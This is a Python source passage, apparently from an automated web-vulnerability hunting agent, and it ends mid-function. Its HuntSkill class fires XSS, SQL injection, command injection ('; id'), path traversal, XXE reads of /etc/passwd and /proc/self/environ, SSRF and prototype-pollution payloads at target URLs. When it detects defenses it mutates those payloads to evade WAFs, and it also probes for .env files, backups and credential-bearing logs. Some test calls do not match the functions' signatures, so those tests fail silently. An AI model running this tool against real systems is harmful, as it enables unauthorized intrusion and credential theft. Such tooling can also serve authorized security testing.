import asyncio
import json
import re
import time
from typing import Dict, Any, List, Tuple
from urllib.parse import urlparse, parse_qs, urlencode
from skills.base import BaseSkill, SkillResult
from skills.bypass import BypassEngine
from skills.temp_email import TempEmail, EmailIDORTester
from skills.deep_exploration import DeepExplorer
from skills.session_bypass import SessionAuthBypass
from skills.evidence_collector import EvidenceCollector
from tools import ToolExecutor


class HuntSkill(BaseSkill):
    """
    Creative hunt skill — real payload injection with adaptive WAF bypass.

    When standard payloads are blocked, automatically switches to bypass mode:
    - WAF detection → payload mutation
    - Rate limiting → slow down + alternative techniques
    - Input filtering → encoding tricks
    - Signature detection → polymorphic payloads
    - Deep exploration → don't stop at 404, Java-specific files, log harvesting
    - Session bypass → cookie swapping, whitespace auth bypass
    """

    def __init__(self, mock: bool = False, scope_guard=None):
        super().__init__(mock)
        self.tools = ToolExecutor(mock=mock)
        self.bypass = BypassEngine()
        self.explorer = DeepExplorer(tools=self.tools, scope_guard=scope_guard)
        self.session_bypass = SessionAuthBypass(tools=self.tools, scope_guard=scope_guard)
        self.evidence_collector = EvidenceCollector()
        self._waf_cache = {}

    def can_handle(self, task_type: str) -> bool:
        return task_type in ["hunt", "idor", "ssrf", "xss", "sqli", "auth_bypass",
                             "ssti", "open_redirect", "lfi", "command_injection",
                             "nosqli", "graphql", "race_condition", "deserialization",
                             "xxe", "path_traversal", "cache_poisoning", "oauth",
                             "jwt", "session", "websocket", "prototype_pollution"]

    MOCK_FINDINGS = {
        "idor": [{"type": "IDOR", "url": "https://api.example.com/v1/users/123", "param": "user_id", "severity": "high", "description": "IDOR via user ID enumeration", "evidence": "Changed user_id from 1 to 2 returned different user data", "confidence": 0.85, "cvss_score": 6.5}],
        "ssrf": [{"type": "SSRF", "url": "https://api.example.com/fetch?url=", "param": "url", "severity": "critical", "description": "SSRF via URL parameter", "evidence": "Status: 200, Body contains internal metadata reference", "confidence": 0.7, "cvss_score": 8.6}],
        "xss": [{"type": "XSS", "url": "https://example.com/search?q=", "param": "q", "severity": "high", "description": "Reflected XSS in search parameter", "evidence": "Payload reflected in response body", "confidence": 0.8, "cvss_score": 6.1}],
        "sqli": [{"type": "SQLi", "url": "https://api.example.com/users?id=", "param": "id", "severity": "critical", "description": "SQL injection in user ID parameter", "evidence": "SQL error message leaked in response", "confidence": 0.9, "cvss_score": 9.8}],
        "auth_bypass": [{"type": "Auth Bypass", "url": "https://admin.example.com/login", "header": "X-Admin: true", "severity": "critical", "description": "Auth bypass via X-Admin header", "evidence": "Status: 200, Body size: 1234", "confidence": 0.6, "cvss_score": 9.8}],
        "ssti": [{"type": "SSTI", "url": "https://example.com/page?name=", "param": "name", "severity": "critical", "description": "SSTI in name parameter", "evidence": "Math result '49' in response", "confidence": 0.85, "cvss_score": 9.8}],
        "open_redirect": [{"type": "Open Redirect", "url": "https://example.com/redirect?url=", "param": "url", "severity": "medium", "description": "Open redirect via url parameter", "evidence": "Redirect to //evil.com", "confidence": 0.9, "cvss_score": 4.3}],
        "lfi": [{"type": "LFI", "url": "https://example.com/file?path=", "param": "path", "severity": "high", "description": "LFI via path parameter", "evidence": "/etc/passwd content in response", "confidence": 0.95, "cvss_score": 7.5}],
        "command_injection": [{"type": "Command Injection", "url": "https://example.com/ping?host=", "param": "host", "severity": "critical", "description": "Command injection in host parameter", "evidence": "uid= output in response", "confidence": 0.9, "cvss_score": 9.8}],
        "nosqli": [{"type": "NoSQLi", "url": "https://api.example.com/login", "severity": "high", "description": "NoSQL injection in login endpoint", "evidence": "POST with NoSQL payload returned 200", "confidence": 0.4, "cvss_score": 7.5}],
        "graphql": [{"type": "GraphQL Introspection", "url": "https://api.example.com/graphql", "severity": "medium", "description": "GraphQL introspection query exposed", "evidence": "Schema introspection enabled", "confidence": 1.0, "cvss_score": 5.3}],
    }

    async def execute(self, context: Dict[str, Any]) -> SkillResult:
        target = context.get("target", "")
        vuln_type = context.get("vuln_type", "all")
        urls = context.get("urls", [])
        attack_surface = context.get("attack_surface", {})
        knowledge = context.get("knowledge", [])
        tech_hints = context.get("tech_hints", "")

        if self.mock:
            return self._mock_response(target, vuln_type)

        findings = []
        data = {"tests_run": [], "tests_passed": [], "bypasses_used": []}

        # Inject knowledge-derived payloads
        if knowledge:
            self._inject_knowledge_payloads(knowledge, vuln_type, target)
            data["knowledge_injected"] = len(knowledge)

        priority_urls = self._prioritize_urls(urls, attack_surface, target)

        # Phase 1: Standard payloads
        standard_findings, test_names = await self._run_standard_tests(priority_urls, target, vuln_type)
        findings.extend(standard_findings)
        data["tests_run"].extend(test_names)

        # Phase 2: If target seems defended, run bypass mutations
        if self.bypass.waf_detected or self._looks_defended(findings):
            data["waf_detected"] = True
            data["waf_type"] = self.bypass.waf_type

            bypass_findings, bypass_names = await self._run_bypass_tests(priority_urls, target, vuln_type)
            findings.extend(bypass_findings)
            data["tests_run"].extend(bypass_names)
            data["bypasses_used"] = list(set(f.get("bypass_technique", "") for f in bypass_findings))

        # Phase 3: Creative edge-case testing (always runs)
        creative_findings = await self._run_creative_tests(priority_urls, target, vuln_type)
        findings.extend(creative_findings)

        # Phase 4: Deep exploration — don't stop at 404, Java files, log harvesting
        deep_results = await self._run_deep_exploration(priority_urls, target, tech_hints)
        findings.extend(deep_results.get("findings", []))

        # Phase 5: Session & auth bypass — cookie swapping, whitespace bypass
        session_results = await self._run_session_bypass(priority_urls, target)
        findings.extend(session_results)

        # Build attack chains from sequential findings
        chain_suggestions = self.explorer.build_chains(findings)
        data["chain_suggestions"] = chain_suggestions

        # Deduplicate by signature
        findings = self._deduplicate_findings(findings)

        return SkillResult(
            success=True,
            findings=findings,
            data=data,
            next_skills=["chain", "validate"],
            confidence=min(len(findings) / 10, 1.0),
        )

    # ─── Mock Response ───────────────────────────────────────────

    def _mock_response(self, target: str, vuln_type: str) -> SkillResult:
        if vuln_type == "all":
            mock_findings = []
            for vt, vt_findings in self.MOCK_FINDINGS.items():
                for f in vt_findings:
                    entry = dict(f)
                    entry["url"] = entry["url"].replace("example.com", target)
                    mock_findings.append(entry)
        else:
            mock_findings = [dict(f) for f in self.MOCK_FINDINGS.get(vuln_type, [])]
            for f in mock_findings:
                f["url"] = f["url"].replace("example.com", target)

        return SkillResult(
            success=True,
            findings=mock_findings,
            data={"tests_run": list(self.MOCK_FINDINGS.keys()) if vuln_type == "all" else [vuln_type]},
            next_skills=["chain", "validate"],
            confidence=0.9,
        )

    # ─── Standard Tests ──────────────────────────────────────────

    async def _run_standard_tests(self, urls: list, target: str, vuln_type: str) -> Tuple[list, list]:
        """Run standard payload tests."""
        findings = []
        test_names = []

        tests = []
        if vuln_type in ("all", "idor"):
            tests.append(("idor", self._hunt_idor))
        if vuln_type in ("all", "ssrf"):
            tests.append(("ssrf", self._hunt_ssrf))
        if vuln_type in ("all", "xss"):
            tests.append(("xss", self._hunt_xss))
        if vuln_type in ("all", "sqli"):
            tests.append(("sqli", self._hunt_sqli))
        if vuln_type in ("all", "auth_bypass"):
            tests.append(("auth_bypass", self._hunt_auth_bypass))
        if vuln_type in ("all", "ssti"):
            tests.append(("ssti", self._hunt_ssti))
        if vuln_type in ("all", "open_redirect"):
            tests.append(("open_redirect", self._hunt_open_redirect))
        if vuln_type in ("all", "lfi", "path_traversal"):
            tests.append(("lfi", self._hunt_lfi))
        if vuln_type in ("all", "command_injection"):
            tests.append(("command_injection", self._hunt_command_injection))
        if vuln_type in ("all", "nosqli"):
            tests.append(("nosqli", self._hunt_nosqli))
        if vuln_type in ("all", "graphql"):
            tests.append(("graphql", self._hunt_graphql))
        if vuln_type in ("all", "xxe"):
            tests.append(("xxe", self._hunt_xxe))
        if vuln_type in ("all", "prototype_pollution"):
            tests.append(("prototype_pollution", self._hunt_prototype_pollution))

        if tests:
            results = await asyncio.gather(
                *[test_fn(urls, target) for _, test_fn in tests],
                return_exceptions=True,
            )
            for (name, _), result in zip(tests, results):
                test_names.append(name)
                if isinstance(result, Exception):
                    continue
                batch_findings, _ = result
                findings.extend(batch_findings)

                # Check for WAF indicators in responses
                for f in batch_findings:
                    evidence = f.get("evidence", "").lower()
                    if any(w in evidence for w in ("403", "blocked", "forbidden", "captcha", "waf")):
                        self.bypass.waf_detected = True

        return findings, test_names

    # ─── Bypass Tests ────────────────────────────────────────────

    async def _run_bypass_tests(self, urls: list, target: str, vuln_type: str) -> Tuple[list, list]:
        """Run bypass-mutated payload tests when WAF is detected."""
        findings = []
        test_names = []

        if vuln_type in ("all", "xss"):
            f, n = await self._bypass_xss(urls)
            findings.extend(f)
            test_names.extend(n)

        if vuln_type in ("all", "sqli"):
            f, n = await self._bypass_sqli(urls)
            findings.extend(f)
            test_names.extend(n)

        if vuln_type in ("all", "ssrf"):
            f, n = await self._bypass_ssrf(urls)
            findings.extend(f)
            test_names.extend(n)

        if vuln_type in ("all", "command_injection"):
            f, n = await self._bypass_command_injection(urls)
            findings.extend(f)
            test_names.extend(n)

        if vuln_type in ("all", "lfi"):
            f, n = await self._bypass_lfi(urls)
            findings.extend(f)
            test_names.extend(n)

        if vuln_type in ("all", "ssti"):
            f, n = await self._bypass_ssti(urls)
            findings.extend(f)
            test_names.extend(n)

        return findings, test_names

    async def _bypass_xss(self, urls: list) -> Tuple[list, list]:
        """Try WAF-bypass XSS payloads."""
        findings = []
        test_names = ["xss_bypass"]

        bypass_payloads = self.bypass.mutate_xss("<script>alert(1)</script>")

        for url in urls[:6]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue

            for param_name in list(params.keys())[:2]:
                for payload in bypass_payloads[:10]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"

                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])

                    if payload in pr["body"] or self._xss_reflected(payload, pr["body"]):
                        findings.append({
                            "type": "XSS (Bypass)",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "high",
                            "evidence": f"WAF bypass payload reflected. Snippet: {pr['body'][:300]}",
                            "description": f"Reflected XSS via WAF bypass in {param_name}",
                            "confidence": 0.85,
                            "bypass_technique": self._classify_bypass(payload),
                            "cvss_score": 6.1,
                            "source_tool": "hunt-bypass",
                        })
                        break

        return findings, test_names

    async def _bypass_sqli(self, urls: list) -> Tuple[list, list]:
        """Try WAF-bypass SQLi payloads."""
        findings = []
        test_names = ["sqli_bypass"]

        bypass_payloads = self.bypass.mutate_sqli("' OR '1'='1")

        for url in urls[:6]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue

            for param_name in list(params.keys())[:2]:
                baseline_resp = await self._make_request(url)
                baseline = self._parse_response(baseline_resp["raw"])
                baseline_len = len(baseline["body"])

                for payload in bypass_payloads[:12]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"

                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])

                    # Check for SQL errors or significant response changes
                    body_lower = pr["body"].lower()
                    sql_errors = ("sql", "mysql", "syntax", "unclosed", "quotation", "odbc", "drivermanager",
                                  "postgresql", "ORA-", "SQLite", "MariaDB")

                    if any(err in body_lower for err in sql_errors):
                        findings.append({
                            "type": "SQLi (Bypass)",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "critical",
                            "evidence": f"WAF bypass SQL error: {pr['body'][:500]}",
                            "description": f"SQL injection via WAF bypass in {param_name}",
                            "confidence": 0.9,
                            "bypass_technique": self._classify_bypass(payload),
                            "cvss_score": 9.8,
                            "source_tool": "hunt-bypass",
                        })
                        break
                    elif abs(len(pr["body"]) - baseline_len) > 200 and pr["status"] == baseline["status"]:
                        findings.append({
                            "type": "SQLi (Bypass)",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "critical",
                            "evidence": f"Response size diff: {baseline_len} -> {len(pr['body'])}",
                            "description": f"Potential SQLi via bypass in {param_name}",
                            "confidence": 0.6,
                            "bypass_technique": self._classify_bypass(payload),
                            "cvss_score": 9.8,
                            "source_tool": "hunt-bypass",
                        })
                        break

        return findings, test_names

    async def _bypass_ssrf(self, urls: list) -> Tuple[list, list]:
        """Try WAF-bypass SSRF payloads."""
        findings = []
        test_names = ["ssrf_bypass"]

        bypass_payloads = self.bypass.mutate_ssrf("http://127.0.0.1")

        for url in urls[:6]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name, values in params.items():
                param_lower = param_name.lower()
                if any(k in param_lower for k in ("url", "uri", "file", "path", "dest", "redirect", "fetch", "load")):
                    for payload in bypass_payloads[:8]:
                        new_params = dict(params)
                        new_params[param_name] = [payload]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"

                        resp = await self._make_request(test_url)
                        pr = self._parse_response(resp["raw"])

                        if pr["status"] in (200, 301, 302, 307):
                            # Check if internal content leaked
                            internal_indicators = ("root:", "metadata", "ami-id", "instance-id",
                                                  "internal", "private", "127.0.0", "localhost")
                            if any(ind in pr["body"].lower() for ind in internal_indicators):
                                findings.append({
                                    "type": "SSRF (Bypass)",
                                    "url": test_url,
                                    "param": param_name,
                                    "payload": payload,
                                    "severity": "critical",
                                    "evidence": f"Bypass SSRF confirmed: {pr['body'][:300]}",
                                    "description": f"SSRF via WAF bypass in {param_name}",
                                    "confidence": 0.8,
                                    "bypass_technique": self._classify_bypass(payload),
                                    "cvss_score": 8.6,
                                    "source_tool": "hunt-bypass",
                                })
                                break

        return findings, test_names

    async def _bypass_command_injection(self, urls: list) -> Tuple[list, list]:
        """Try WAF-bypass command injection payloads."""
        findings = []
        test_names = ["cmdi_bypass"]

        bypass_payloads = self.bypass.mutate_command_injection("; id")

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload in bypass_payloads[:8]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"

                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])

                    if any(x in pr["body"] for x in ("uid=", "root:", "bin/", "total ")):
                        findings.append({
                            "type": "Command Injection (Bypass)",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "critical",
                            "evidence": f"Bypass command output: {pr['body'][:500]}",
                            "description": f"Command injection via WAF bypass in {param_name}",
                            "confidence": 0.9,
                            "bypass_technique": self._classify_bypass(payload),
                            "cvss_score": 9.8,
                            "source_tool": "hunt-bypass",
                        })
                        break

        return findings, test_names

    async def _bypass_lfi(self, urls: list) -> Tuple[list, list]:
        """Try WAF-bypass LFI payloads."""
        findings = []
        test_names = ["lfi_bypass"]

        bypass_payloads = self.bypass.mutate_lfi("../../../etc/passwd")

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload in bypass_payloads[:8]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"

                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])

                    if "root:" in pr["body"] or "daemon:" in pr["body"] or "bin/bash" in pr["body"]:
                        findings.append({
                            "type": "LFI (Bypass)",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "high",
                            "evidence": f"Bypass LFI content: {pr['body'][:500]}",
                            "description": f"LFI via WAF bypass in {param_name}",
                            "confidence": 0.95,
                            "bypass_technique": self._classify_bypass(payload),
                            "cvss_score": 7.5,
                            "source_tool": "hunt-bypass",
                        })
                        break

        return findings, test_names

    async def _bypass_ssti(self, urls: list) -> Tuple[list, list]:
        """Try WAF-bypass SSTI payloads."""
        findings = []
        test_names = ["ssti_bypass"]

        bypass_payloads = self.bypass.mutate_ssti("{{7*7}}")

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload in bypass_payloads[:8]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"

                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])

                    # Check for evaluation proof with context validation
                    # Expected results: 49 (for {{7*7}}), 7777777 (for {{7*'7'}})
                    for expected in ("49", "7777777", "823543"):
                        if expected in pr["body"]:
                            # Verify payload is NOT just echoed back
                            idx = pr["body"].find(expected)
                            start = max(0, idx - 50)
                            end = min(len(pr["body"]), idx + len(expected) + 50)
                            context = pr["body"][start:end]
                            # Reject if raw payload syntax is in context (reflection ≠ evaluation)
                            if "{{{" + expected + "}" not in context and "${" + expected + "}" not in context:
                                findings.append({
                                    "type": "SSTI (Bypass)",
                                    "url": test_url,
                                    "endpoint": test_url,
                                    "param": param_name,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "severity": "critical",
                                    "evidence": f"Bypass SSTI evaluation confirmed: {context.replace(chr(10), ' ').replace(chr(13), '')[:300]}",
                                    "description": f"SSTI via WAF bypass in {param_name} — {expected} evaluated",
                                    "confidence": 0.85,
                                    "bypass_technique": self._classify_bypass(payload),
                                    "cvss_score": 9.8,
                                    "source_tool": "hunt-bypass",
                                    "status_code": pr["status"],
                                    "evaluation_proof": expected,
                                    "response_context": context,
                                    "tested_url": test_url,
                                    "http_request": f"GET {test_url} HTTP/1.1\nHost: {parsed.netloc}\nUser-Agent: Mozilla/5.0\nAccept: */*",
                                    "http_response": f"HTTP/1.1 {pr['status']}\nContent-Type: text/html\n\n{context.replace(chr(10), ' ').replace(chr(13), '')[:500]}",
                                })
                                break

        return findings, test_names

    # ─── Creative Tests (Always Runs) ────────────────────────────

    async def _run_creative_tests(self, urls: list, target: str, vuln_type: str) -> list:
        """
        Creative edge-case testing that works even against defended targets.
        These tests go beyond standard payloads.
        """
        findings = []

        if vuln_type in ("all", "idor"):
            findings.extend(await self._creative_idor(urls, target))

        if vuln_type in ("all", "auth_bypass"):
            findings.extend(await self._creative_auth_bypass(urls))

        if vuln_type in ("all", "ssrf"):
            findings.extend(await self._creative_ssrf(urls))

        if vuln_type in ("all", "sqli"):
            findings.extend(await self._creative_sqli(urls))

        if vuln_type in ("all", "xss"):
            findings.extend(await self._creative_xss(urls))

        return findings

    async def _creative_idor(self, urls: list, target: str) -> list:
        """Creative IDOR testing — try UUIDs, encoded IDs, path manipulation."""
        findings = []

        for url in urls[:8]:
            parsed = urlparse(url)
            path_parts = parsed.path.strip("/").split("/")

            # Try path-based IDOR (REST APIs)
            for i, part in enumerate(path_parts):
                if part.isdigit():
                    original = int(part)
                    # Try different ID sequences
                    for test_id in [original + 1, original - 1, original + 100, 1, 0]:
                        if test_id == original or test_id < 0:
                            continue
                        new_parts = list(path_parts)
                        new_parts[i] = str(test_id)
                        new_url = f"{parsed.scheme}://{parsed.netloc}/{'/'.join(new_parts)}"
                        if parsed.query:
                            new_url += f"?{parsed.query}"

                        resp = await self._make_request(new_url)
                        pr = self._parse_response(resp["raw"])

                        if pr["status"] == 200 and len(pr["body"]) > 50:
                            findings.append({
                                "type": "IDOR (Creative)",
                                "url": new_url,
                                "param": f"path[{i}]",
                                "severity": "high",
                                "evidence": f"Path manipulation: {original} -> {test_id}, Status: {pr['status']}, Size: {len(pr['body'])}",
                                "description": f"IDOR via path manipulation (REST)",
                                "confidence": 0.6,
                                "bypass_technique": "path_traversal",
                                "cvss_score": 6.5,
                                "source_tool": "hunt-creative",
                            })
                            break

                # Try UUID-style IDs
                if len(part) == 36 and part.count("-") == 4:
                    fake_uuid = "00000000-0000-0000-0000-000000000001"
                    new_parts = list(path_parts)
                    new_parts[i] = fake_uuid
                    new_url = f"{parsed.scheme}://{parsed.netloc}/{'/'.join(new_parts)}"
                    if parsed.query:
                        new_url += f"?{parsed.query}"

                    findings.append({
                        "type": "IDOR (UUID)",
                        "url": new_url,
                        "param": f"path[{i}]",
                        "severity": "medium",
                        "evidence": f"UUID manipulation test: {part} -> {fake_uuid}",
                        "description": "Testing UUID-based IDOR",
                        "confidence": 0.3,
                        "bypass_technique": "uuid_substitution",
                        "cvss_score": 6.5,
                        "source_tool": "hunt-creative",
                    })

        return findings

    async def _creative_auth_bypass(self, urls: list) -> list:
        """Creative auth bypass — try header injection, HTTP method tampering, etc."""
        findings = []

        for url in urls[:5]:
            # Method tampering
            for method in ["PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]:
                resp = await self._make_request(url, method=method)
                pr = self._parse_response(resp["raw"])

                if pr["status"] == 200 and method not in ("OPTIONS", "HEAD"):
                    findings.append({
                        "type": "Auth Bypass (Method)",
                        "url": url,
                        "severity": "medium",
                        "evidence": f"{method} returned 200 (expected 403/405)",
                        "description": f"HTTP method tampering: {method} on {url}",
                        "confidence": 0.4,
                        "bypass_technique": "method_tampering",
                        "cvss_score": 5.3,
                        "source_tool": "hunt-creative",
                    })

            # Path traversal auth bypass
            for bypass_path in ["/%2e/", "/./", "/..;/", "/..%00/", "/%2f/"]:
                test_url = url.rstrip("/") + bypass_path
                resp = await self._make_request(test_url)
                pr = self._parse_response(resp["raw"])

                if pr["status"] == 200:
                    findings.append({
                        "type": "Auth Bypass (Path)",
                        "url": test_url,
                        "severity": "high",
                        "evidence": f"Path bypass {bypass_path} returned 200",
                        "description": f"Path traversal auth bypass: {bypass_path}",
                        "confidence": 0.5,
                        "bypass_technique": "path_normalization",
                        "cvss_score": 7.5,
                        "source_tool": "hunt-creative",
                    })

        return findings

    async def _creative_ssrf(self, urls: list) -> list:
        """Creative SSRF — try DNS rebinding, protocol smuggling, etc."""
        findings = []

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name, values in params.items():
                param_lower = param_name.lower()
                if any(k in param_lower for k in ("url", "uri", "fetch", "load", "img", "src", "image", "avatar")):
                    # Try protocol smuggling
                    for proto in ["gopher://", "dict://", "tftp://", "jar://"]:
                        payload = f"{proto}127.0.0.1:80"
                        new_params = dict(params)
                        new_params[param_name] = [payload]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"

                        findings.append({
                            "type": "SSRF (Protocol)",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "high",
                            "evidence": f"Protocol smuggling test: {proto}",
                            "description": f"SSRF via {proto} protocol",
                            "confidence": 0.3,
                            "bypass_technique": "protocol_smuggling",
                            "cvss_score": 7.5,
                            "source_tool": "hunt-creative",
                        })

        return findings

    async def _creative_sqli(self, urls: list) -> list:
        """Creative SQLi — try time-based blind, out-of-band, etc."""
        findings = []

        time_payloads = [
            ("1' AND SLEEP(5)--", 5),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
            ("1'; WAITFOR DELAY '0:0:5'--", 5),
            ("1' AND BENCHMARK(5000000,SHA1('test'))--", 5),
        ]

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload, expected_delay in time_payloads[:2]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"

                    import time
                    start = time.time()
                    resp = await self._make_request(test_url, timeout=15)
                    elapsed = time.time() - start

                    if elapsed >= expected_delay - 1:
                        findings.append({
                            "type": "SQLi (Time-based)",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "critical",
                            "evidence": f"Response delayed {elapsed:.1f}s (expected {expected_delay}s)",
                            "description": f"Time-based blind SQLi in {param_name}",
                            "confidence": 0.85,
                            "bypass_technique": "time_based_blind",
                            "cvss_score": 9.8,
                            "source_tool": "hunt-creative",
                        })
                        break

        return findings

    async def _creative_xss(self, urls: list) -> list:
        """Creative XSS — try DOM-based, stored, and mutation XSS."""
        findings = []

        dom_payloads = [
            "#<script>alert(1)</script>",
            "#<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ]

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload in dom_payloads[:3]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"

                    findings.append({
                        "type": "XSS (DOM)",
                        "url": test_url,
                        "param": param_name,
                        "payload": payload,
                        "severity": "medium",
                        "evidence": f"DOM-based XSS payload injected (requires client-side validation)",
                        "description": f"Potential DOM-based XSS in {param_name}",
                        "confidence": 0.3,
                        "bypass_technique": "dom_injection",
                        "cvss_score": 6.1,
                        "source_tool": "hunt-creative",
                    })

        return findings

    # ─── Deep Exploration ─────────────────────────────────────────

    async def _run_deep_exploration(self, urls: list, target: str, tech_hints: str) -> dict:
        """
        Deep exploration — don't stop at 404.

        Inspired by the $40K bounty writeup:
        - Fuzz endpoints without params to find parameter names
        - Use Java-specific files for LFI (WEB-INF/web.xml)
        - Harvest log files for credentials and RCE output
        - Build attack chains from sequential findings
        """
        all_findings = []
        all_tech_files = []
        all_credentials = []
        all_log_endpoints = []

        # Parse tech hints
        tech_stack = []
        if tech_hints:
            tech_stack = [t.strip() for t in tech_hints.split(",")]

        # Explore each URL
        for url in urls[:5]:
            try:
                parsed = urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}"
                endpoint = parsed.path

                result = await self.explorer.explore_endpoint(
                    base_url, endpoint, tech_stack
                )

                # Convert deep exploration findings to hunt format
                for f in result.get("findings", []):
                    all_findings.append({
                        "type": f.get("type", "deep_finding"),
                        "url": f.get("url", url),
                        "severity": f.get("severity", "medium"),
                        "evidence": f.get("evidence", ""),
                        "description": f.get("description", ""),
                        "confidence": 0.7,
                        "cvss_score": 7.5 if f.get("severity") == "critical" else 5.0,
                        "source_tool": "deep-explorer",
                        "file": f.get("file", ""),
                    })

                all_tech_files.extend(result.get("tech_files", []))
                all_credentials.extend(result.get("credentials", []))
                all_log_endpoints.extend(result.get("log_endpoints", []))

            except Exception:
                continue

        # Try common endpoints that might exist
        common_endpoints = [
            "/admin/", "/admin/download", "/admin/export",
            "/download", "/export", "/api/", "/api/v1/",
            "/.env", "/config", "/backup", "/logs/",
        ]

        for endpoint in common_endpoints:
            try:
                base_url = f"https://{target}"
                result = await self.explorer.explore_endpoint(
                    base_url, endpoint, tech_stack
                )
                for f in result.get("findings", []):
                    if f.get("status") in (200, 301, 302, 307):
                        all_findings.append({
                            "type": f.get("type", "endpoint_discovery"),
                            "url": f.get("url", f"{base_url}{endpoint}"),
                            "severity": "medium",
                            "evidence": f.get("evidence", ""),
                            "description": f.get("description", ""),
                            "confidence": 0.6,
                            "cvss_score": 5.0,
                            "source_tool": "deep-explorer",
                        })
            except Exception:
                continue

        return {
            "findings": all_findings,
            "tech_files": all_tech_files,
            "credentials": all_credentials,
            "log_endpoints": all_log_endpoints,
        }

    # ─── Session & Auth Bypass ───────────────────────────────────

    async def _run_session_bypass(self, urls: list, target: str) -> list:
        """
        Session & auth bypass testing.

        Techniques:
        - Cookie swapping between subdomains
        - Whitespace/encoded space bypass (%20)
        - Header-based auth bypass
        - Token manipulation
        """
        findings = []

        # Test whitespace bypass on login endpoints
        login_endpoints = [
            "/login", "/admin/login", "/signin", "/auth/login",
            "/api/login", "/sso/login", "/saml/login",
        ]

        for url in urls[:5]:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            for endpoint in login_endpoints:
                login_url = f"{base_url}{endpoint}"
                try:
                    ws_findings = await self.session_bypass.test_whitespace_bypass(login_url)
                    findings.extend(ws_findings)
                except Exception:
                    continue

        # Test header-based auth bypass
        for url in urls[:5]:
            try:
                header_findings = await self.session_bypass.test_header_bypass(url)
                findings.extend(header_findings)
            except Exception:
                continue

        # Test token manipulation
        for url in urls[:5]:
            if any(k in url.lower() for k in ("/api/", "/v1/", "/graphql")):
                try:
                    token_findings = await self.session_bypass.test_token_manipulation(url, "test")
                    findings.extend(token_findings)
                except Exception:
                    continue

        return findings

    # ─── Additional Vuln Tests ───────────────────────────────────

    async def _hunt_xxe(self, urls: list) -> Tuple[list, list]:
        """Test for XXE vulnerabilities."""
        findings = []
        test_names = ["xxe"]

        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
        ]

        for url in urls[:5]:
            for payload in xxe_payloads[:1]:
                resp = await self._make_request(url, method="POST", data=payload,
                                                headers={"Content-Type": "application/xml"})
                pr = self._parse_response(resp["raw"])

                if "root:" in pr["body"] or "daemon:" in pr["body"]:
                    findings.append({
                        "type": "XXE",
                        "url": url,
                        "payload": payload[:200],
                        "severity": "critical",
                        "evidence": f"XXE file read: {pr['body'][:500]}",
                        "description": "XXE vulnerability via XML input",
                        "confidence": 0.9,
                        "cvss_score": 8.6,
                        "source_tool": "hunt",
                    })

        return findings, test_names

    async def _hunt_prototype_pollution(self, urls: list) -> Tuple[list, list]:
        """Test for prototype pollution."""
        findings = []
        test_names = ["prototype_pollution"]

        payloads = [
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
        ]

        for url in urls[:3]:
            for payload in payloads[:1]:
                resp = await self._make_request(url, method="POST", data=payload,
                                                headers={"Content-Type": "application/json"})
                pr = self._parse_response(resp["raw"])

                if pr["status"] in (200, 201):
